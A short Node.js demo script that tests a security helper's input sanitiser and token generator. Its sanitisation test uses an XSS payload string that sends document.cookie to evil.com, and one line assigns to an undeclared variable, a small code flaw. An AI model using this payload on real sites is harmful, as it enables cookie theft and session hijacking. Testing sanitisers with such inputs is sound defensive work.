/**
 * Advanced Usage Demo for Production Web Utilities
 */
const { validateSecureEmail, sanitizeInput, generateSecureToken } = require('../security-helper');

console.log("--- Starting Production Utilities Demo ---");

// 1. Test sanitization
const maliciousInput = "<script>fetch('http://evil.com?cookie=' + document.cookie)</script>";
const cleanOutput = sanitizeInput(maliciousInput);
console.log("Sanitized Input Result:", cleanOutput);

// 2. Test secure token generation
const sessionToken = generateServiceToken = generateSecureToken(40);
console.log("Generated Secure Session Token:", sessionToken);

console.log("--- Demo Completed Successfully ---");
